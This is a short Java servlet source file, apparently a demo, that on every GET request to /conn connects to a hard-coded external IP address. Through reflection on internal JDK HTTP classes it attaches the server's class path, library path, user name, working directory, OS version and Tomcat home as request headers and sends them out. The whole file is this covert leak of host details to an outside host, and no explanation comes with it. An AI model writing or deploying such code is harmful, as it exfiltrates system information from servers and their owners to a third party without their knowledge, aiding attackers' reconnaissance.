package com.example.servletdemo; /**
 * @author : Walker
 * @date : Created in 2022/6/1 3:40 PM
 * @description: ${description}
 */

import javax.servlet.http.*;
import javax.servlet.annotation.*;
import sun.net.www.MessageHeader;
import sun.net.www.protocol.http.HttpURLConnection;
import sun.security.action.GetPropertyAction;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.security.AccessController;

@WebServlet(name = "urlconnservlet", value = "/conn")
public class URLConnServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws  IOException {
        try {
            System.out.printf(System.getProperties().toString());
            HttpURLConnection connection = null;
            URL url = new URL( "http://124.220.178.196:8082/" );
            connection = new HttpURLConnection(url, null);
            connection.connect();
            Field var1 = connection.getClass().getDeclaredField("requests");
            var1.setAccessible(true);
            MessageHeader messageHeader = (MessageHeader) var1.get(connection);
            messageHeader.setIfNotSet("ClassPath", (String) AccessController.doPrivileged(new GetPropertyAction("java.class.path")));
            messageHeader.setIfNotSet("LibraryPath", (String) AccessController.doPrivileged(new GetPropertyAction("java.library.path")));
            messageHeader.setIfNotSet("UserName", (String) AccessController.doPrivileged(new GetPropertyAction("user.name")));
            messageHeader.setIfNotSet("UserDir", (String) AccessController.doPrivileged(new GetPropertyAction("user.dir")));
            messageHeader.setIfNotSet("OS-Version", (String) AccessController.doPrivileged(new GetPropertyAction("os.version")));
            messageHeader.setIfNotSet("Tomcat", (String) AccessController.doPrivileged(new GetPropertyAction("catalina.home")));
            Method wrequests = connection.getClass().getDeclaredMethod("writeRequests");
            wrequests.setAccessible(true);
            wrequests.invoke(connection);
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws  IOException {

    }
}
